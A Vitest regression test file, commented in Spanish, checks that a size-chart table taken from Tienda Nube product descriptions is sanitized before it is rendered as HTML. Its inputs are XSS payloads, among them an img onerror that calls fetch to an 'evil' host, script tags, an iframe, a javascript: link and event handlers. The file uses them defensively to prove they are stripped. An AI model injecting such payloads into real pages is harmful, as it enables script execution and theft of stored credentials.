// @vitest-environment jsdom
import { describe, it, expect } from 'vitest'
import { tablaActualHtml, extraerTabla } from '@/components/gen-talles/tabla-dom'

/**
 * `tablaActualHtml` toma la primera `<table>` de la **descripción de un producto de Tienda Nube** y
 * su resultado va a `dangerouslySetInnerHTML` (`GenTalles.tsx:182`). Esa descripción la escribe
 * cualquiera con acceso al panel de TN, una integración, o una cuenta comprometida: es entrada
 * ajena, y hasta el 13-ago-2026 entraba cruda.
 *
 * `DOMParser` **no sanitiza**: parsea. Así que un `onerror` en la descripción se ejecutaba al abrir
 * la sección, y lo primero que ese JS podía leer era la contraseña que el Monitor guardaba en
 * `localStorage`. Este archivo fija que eso no vuelva.
 */

const conTabla = (interior: string) => `<p>bla</p><table>${interior}</table><p>chau</p>`

describe('lo que NO puede sobrevivir', () => {
  it('los handlers de evento se van', () => {
    const html = tablaActualHtml(conTabla('<tr><td onclick="robar()">36</td></tr>'))!
    expect(html).not.toContain('onclick')
    expect(html).not.toContain('robar')
    expect(html).toContain('36') // el dato sí queda
  })

  it('el `<img onerror>` clásico se va entero', () => {
    // El vector real: `<script>` no corre vía innerHTML, pero un `img` roto con `onerror` sí.
    const html = tablaActualHtml(conTabla('<tr><td><img src="x" onerror="fetch(\'//evil\')"></td></tr>'))!
    expect(html.toLowerCase()).not.toContain('onerror')
    expect(html.toLowerCase()).not.toContain('<img')
    expect(html).not.toContain('evil')
  })

  it('un `<script>` adentro de una celda tampoco queda', () => {
    const html = tablaActualHtml(conTabla('<tr><td><script>alert(1)</script>40</td></tr>'))!
    expect(html.toLowerCase()).not.toContain('<script')
  })

  it('`style` se va: es inyección de CSS, no formato', () => {
    const html = tablaActualHtml(conTabla('<tr><td style="position:fixed;inset:0">36</td></tr>'))!
    expect(html).not.toContain('style')
    expect(html).not.toContain('position:fixed')
  })

  it('los atributos de la propia `<table>` también', () => {
    const doc = '<table onmouseover="x()" class="y"><tr><td>36</td></tr></table>'
    const html = tablaActualHtml(doc)!
    expect(html).not.toContain('onmouseover')
    expect(html).not.toContain('class')
  })

  it('un `<iframe>` o un `<a href=javascript:>` no pasan', () => {
    const html = tablaActualHtml(conTabla('<tr><td><iframe src="//evil"></iframe><a href="javascript:x()">ir</a></td></tr>'))!
    expect(html.toLowerCase()).not.toContain('<iframe')
    expect(html.toLowerCase()).not.toContain('javascript:')
    expect(html.toLowerCase()).not.toContain('<a ')
  })
})

describe('lo que SÍ tiene que quedar', () => {
  it('la estructura de la tabla, intacta', () => {
    const html = tablaActualHtml(conTabla('<thead><tr><th>Talle</th><th>36</th></tr></thead><tbody><tr><td>Busto</td><td>68 CM</td></tr></tbody>'))!
    for (const tag of ['<table', '<thead', '<tbody', '<tr', '<th', '<td']) expect(html).toContain(tag)
    expect(html).toContain('Busto')
    expect(html).toContain('68 CM')
  })

  it('colspan y rowspan sobreviven: sin ellos la tabla se desarma', () => {
    const html = tablaActualHtml(conTabla('<tr><td colspan="2" rowspan="3">36</td></tr>'))!
    expect(html).toContain('colspan="2"')
    expect(html).toContain('rowspan="3"')
  })

  it('el negrita se mantiene', () => {
    const html = tablaActualHtml(conTabla('<tr><th><strong>Talle</strong></th></tr>'))!
    expect(html).toContain('<strong>')
  })

  it('el texto de una etiqueta prohibida NO se pierde', () => {
    // Si el talle estaba adentro de un `<font>` viejo de TN, el número tiene que seguir estando.
    const html = tablaActualHtml(conTabla('<tr><td><font color="red">42</font></td></tr>'))!
    expect(html.toLowerCase()).not.toContain('<font')
    expect(html).toContain('42')
  })

  it('sin tabla, null (y no revienta con basura)', () => {
    expect(tablaActualHtml('<p>sin tabla</p>')).toBeNull()
    expect(tablaActualHtml('')).toBeNull()
    expect(tablaActualHtml(undefined)).toBeNull()
  })
})

describe('extraerTabla sigue leyendo lo mismo', () => {
  it('saca talles y medidas de una tabla sucia', () => {
    // Va aparte porque `extraerTabla` lee `textContent`, no HTML: nunca fue el camino vulnerable.
    // Se prueba igual para que el sanitizado de al lado no lo rompa por vecindad.
    const t = extraerTabla(conTabla(
      '<tr><th>Medida</th><th>T 36</th><th>T 38</th></tr>' +
      '<tr><td onclick="x()">a) Busto</td><td>68 CM</td><td>72 cm</td></tr>',
    ))!
    expect(t.talles).toEqual(['36', '38'])
    expect(t.medidas[0]!.nombre).toBe('Busto')
    expect(t.medidas[0]!.valores).toEqual({ '36': '68', '38': '72' })
  })
})
